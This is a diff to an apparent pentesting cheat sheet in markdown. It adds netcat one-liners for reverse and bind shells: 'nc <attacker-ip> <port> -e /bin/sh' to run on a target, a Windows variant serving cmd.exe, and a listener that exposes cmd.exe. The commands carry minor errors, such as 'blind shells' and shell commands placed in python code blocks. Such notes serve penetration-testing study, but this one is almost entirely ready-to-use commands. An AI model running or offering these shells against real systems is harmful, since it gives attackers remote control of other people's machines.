@@ -19,8 +19,24 @@ sudo nc -lvnp 443`
 
 #### Bind Shells
 **The syntax for this is relatively straight forward:**
+Below is used to connect to blind shells
 
 ```python
 nc <target-ip> <chosen-port>
 ```
 
+#### netcat one liner reverse shell
+execute below one on target and start listener on your own system.
+```python
+ nc <attacker-ip> <chosen-port> -e /bin/sh
+```
+
+#### Same but for windows
+```python
+nc <attacker-ip> <chosen-port> -e "cmd.exe"
+```
+
+#### Starting a listener on windows
+```python
+nc -lvnp 12345 -e "cmd.exe"
+```
